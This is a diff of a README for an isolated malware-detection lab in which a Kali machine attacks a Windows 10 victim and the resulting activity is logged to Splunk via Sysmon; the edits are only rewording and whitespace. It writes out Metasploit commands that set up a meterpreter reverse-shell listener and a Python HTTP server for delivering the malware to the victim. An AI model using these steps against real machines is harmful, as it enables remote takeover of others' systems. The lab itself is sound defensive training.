@@ -29,14 +29,15 @@ First, we need to understand the network connections in the virtual environment.
 - Testing Tools     ---> NAT, NAT Network, Bridged
 - Analyzing Malware ---> Host-Only, Internal Network/LAN Segment, Not Attached
 
-In this lab, since we are going to create malware with Kali Linux and attack Windows Machine, the lab environment should not be connected to the internet. 
+In this lab, the lab environment was not connected to the Internet because of the creation of malware with Kali Linux and the attack on the Windows machine.
 
 1-Installation and Setup of Virtual Machines 
 
 - Kali Linux (attacker), Windows 10 (victim) and Ubuntu 22.04 (Splunk) were installed on VirtuelBox as virtual machines.
 - Splunk Enterprise was installed on the Ubuntu machine to view logs.
 - Universal Forwarder and Sysmon were installed on Windows 10 machine to send logs to Splunk.
-- After selecting 'Internal Network' as network, fixed IP address was selected on each virtual machine. After all that, we saw that the virtual machines were reachable with the ‘ping’ command.
+- After selecting 'Internal Network' as network, fixed IP address was selected on each virtual machine.
+- After all that, we saw that the virtual machines were reachable with the ‘ping’ command.
 
 2-Attack Scenario 
 
@@ -48,14 +49,14 @@ In this lab, since we are going to create malware with Kali Linux and attack Win
 
 - With this malware we will obtain a 'reverse shell' and create a connection to our own machine. After logging into the msfconsole where I will execute the attack, I entered the values for the payload we selected and started the attack.
     - use exploit/multi/handler 
-    - options 		#to see what we can configure 
+    - options #to see what we can configure 
     - set payload windows/x64/meterpreter/reverse_tcp 
     - set lhost 192.168.2.250 
-    - set lport 4444 		#this is already given 
+    - set lport 4444 #this is already given 
     - exploit 
 
 - After that, we wait for the victim machine to run the malware. For this we will create an HTTP Server on the Kali Linux machine so that the victim machine can download the malware from there. 
-    - python3 -m http.server 9999 		#make sure to run it in the directory where the malware is located 
+    - python3 -m http.server 9999 #make sure to run it in the directory where the malware is located 
 
 3-Exploitation 
  
@@ -68,4 +69,4 @@ In this lab, since we are going to create malware with Kali Linux and attack Win
 
 - Since I have installed sysmon on the Windows (victim) machine and configured it correctly to send logs to Splunk, I can deep dive into logs. 
 
-Note: Sysmon logs are not fully parsed by Splunk so don't forget to install Splunk Add-on for Sysmon. 
+Note: Sysmon logs are not fully parsed by Splunk so don't forget to install Splunk Add-on for Sysmon to get more fields. 
